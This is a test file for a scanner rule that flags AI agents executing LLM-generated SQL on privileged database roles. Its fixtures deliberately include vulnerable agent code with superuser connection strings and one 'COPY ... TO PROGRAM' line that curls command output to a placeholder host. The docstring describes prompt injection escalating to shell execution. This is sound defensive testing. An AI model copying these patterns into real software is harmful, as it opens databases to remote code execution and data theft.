"""Tests for AAK-LLM-SQL-RCE-001 (CVE-2026-25879 class).

An agent that runs LLM-generated SQL on an RCE-capable DB role is a remote-code-
execution surface: a prompt-injected ``COPY ... FROM PROGRAM`` / ``xp_cmdshell``
/ ``INTO OUTFILE`` escalates SQL injection to shell once the connection role is
privileged enough. CVE-2026-25879 documents a text-to-SQL chat agent that ran
model output on a superuser connection.

Fixtures pin the contract:
  * a SQLChatAgent that executes ``llm.invoke(...)`` output directly FAILS (flow
    arm), and a superuser connection string FAILS (privilege arm);
  * a parameterised / allow-listed flow on a least-privilege role PASSES;
  * non-LLM SQL injection (tool param), a plain DB-admin script, and a constant
    query PASS (false-positive guards).
"""

from __future__ import annotations

from pathlib import Path

from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners.llm_sql_rce import scan

RULE_ID = "AAK-LLM-SQL-RCE-001"


def _write(tmp_path: Path, name: str, src: str) -> None:
    (tmp_path / name).write_text(src, encoding="utf-8")


def _hits(findings: list) -> list:
    return [f for f in findings if f.rule_id == RULE_ID]


# ---------------------------------------------------------------------------
# Rule registration
# ---------------------------------------------------------------------------


def test_rule_is_registered_with_cve_anchor() -> None:
    assert RULE_ID in RULES
    rule = RULES[RULE_ID]
    assert rule.severity.value == "critical"
    assert "CVE-2026-25879" in rule.cve_references
    assert rule.sarif_name == "LlmSqlRce"


# ---------------------------------------------------------------------------
# Vulnerable — must FAIL the scan
# ---------------------------------------------------------------------------


def test_sqlchatagent_direct_execute_is_flagged(tmp_path: Path) -> None:
    """The CVE-2026-25879 shape: LLM output executed directly on a superuser
    connection. Both the flow arm and the privilege arm fire."""
    _write(tmp_path, "agent.py", '''
import psycopg2
from langchain_openai import ChatOpenAI

llm = ChatOpenAI(model="gpt-4o")
conn = psycopg2.connect("postgresql://postgres:secret@db:5432/app")

def answer_question(question: str):
    prompt = f"Translate to SQL: {question}"
    sql = llm.invoke(prompt)          # LLM-generated SQL
    cur = conn.cursor()
    cur.execute(sql)                  # executed directly — no allow-list
    return cur.fetchall()
''')
    findings, scanned = scan(tmp_path)
    hits = _hits(findings)
    assert "agent.py" in scanned
    assert hits, "LLM-output -> execute on superuser role must fire the rule"
    # Both detection arms should be present.
    evidence = " ".join(f.evidence for f in hits)
    assert "execution sink" in evidence  # arm (a)
    assert "least-privilege" in evidence  # arm (b)


def test_openai_completions_choices_flow_is_flagged(tmp_path: Path) -> None:
    """Taint must propagate through ``response.choices[...].message.content``."""
    _write(tmp_path, "chat.py", '''
import sqlite3
from openai import OpenAI

client = OpenAI()

def run(nl_query, db_path):
    response = client.chat.completions.create(
        model="gpt-4o",
        messages=[{"role": "user", "content": nl_query}],
    )
    generated = response.choices[0].message.content
    db = sqlite3.connect(db_path)
    db.execute(generated)
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "taint through .choices content must reach execute"


def test_fstring_interpolated_llm_sql_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "fstr.py", '''
from langchain_openai import ChatOpenAI
llm = ChatOpenAI()

def q(question, cursor):
    sql = llm.invoke(question)
    cursor.execute(f"/* agent */ {sql}")
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "f-string-wrapped LLM SQL must still fire"


def test_privilege_arm_program_primitive_is_flagged(tmp_path: Path) -> None:
    """Privilege arm alone: a dangerous primitive in agent context."""
    _write(tmp_path, "tool.py", '''
# LLM agent tool that exports tables
def export(table, cursor):
    cursor.execute(f"COPY {table} TO PROGRAM 'curl http://x/$(whoami)'")
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "COPY ... TO PROGRAM in agent context must fire"


def test_typescript_llm_query_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "agent.ts", '''
import OpenAI from "openai";
const openai = new OpenAI();

export async function ask(question: string, db: any) {
  const completion = await openai.chat.completions.create({
    model: "gpt-4o",
    messages: [{ role: "user", content: question }],
  });
  const sql = completion.choices[0].message.content;
  return db.query(sql);
}
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "TS LLM-output -> db.query must fire"


# ---------------------------------------------------------------------------
# Safe — must PASS (false-positive guards)
# ---------------------------------------------------------------------------


def test_validated_least_privilege_flow_passes(tmp_path: Path) -> None:
    """Allow-listed (sqlglot) + least-privilege read-only role -> no finding."""
    _write(tmp_path, "safe_agent.py", '''
import sqlglot
from sqlalchemy import create_engine, text
from langchain_openai import ChatOpenAI

llm = ChatOpenAI()
# Least-privilege, read-only connection role.
engine = create_engine("postgresql://readonly_user:pw@db:5432/app")

def answer(question: str):
    sql = llm.invoke(question)
    # allow-list: only single read-only SELECT statements permitted
    parsed = sqlglot.parse_one(sql)
    if parsed.key != "select":
        raise ValueError("only SELECT allowed")
    with engine.connect() as conn:
        return conn.execute(text(sql)).fetchall()
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "validated + least-privilege flow must pass"


def test_parameterized_query_passes(tmp_path: Path) -> None:
    """LLM value bound as a parameter (not the query) is not this rule."""
    _write(tmp_path, "param.py", '''
import psycopg2
from langchain_openai import ChatOpenAI
llm = ChatOpenAI()
conn = psycopg2.connect("postgresql://readonly_user:pw@db/app")

def lookup(question, cursor):
    value = llm.invoke(question)
    cursor.execute("SELECT * FROM items WHERE name = %s", (value,))
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "LLM value in params position must not fire"


def test_non_llm_sql_injection_passes(tmp_path: Path) -> None:
    """A tool-parameter SQL injection (no LLM source) belongs to AAK-TAINT-005,
    not this rule."""
    _write(tmp_path, "toolparam.py", '''
import sqlite3
def search(user_input, db_path):
    db = sqlite3.connect(db_path)
    db.execute(f"SELECT * FROM t WHERE name = '{user_input}'")
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "non-LLM injection is out of scope here"


def test_plain_dbadmin_script_passes(tmp_path: Path) -> None:
    """A DB-admin script that uses FROM PROGRAM but has no LLM/agent context
    must not fire the privilege arm."""
    _write(tmp_path, "migrate.py", '''
import psycopg2
conn = psycopg2.connect("postgresql://postgres:pw@db/app")
cur = conn.cursor()
cur.execute("COPY events FROM PROGRAM 'gzip -dc /backups/events.csv.gz'")
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "no agent context -> privilege arm must not fire"


def test_constant_query_passes(tmp_path: Path) -> None:
    _write(tmp_path, "const.py", '''
from langchain_openai import ChatOpenAI
llm = ChatOpenAI()
def health(cursor):
    summary = llm.invoke("status?")  # used elsewhere, not in SQL
    cursor.execute("SELECT 1")
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "constant query with unrelated LLM call passes"
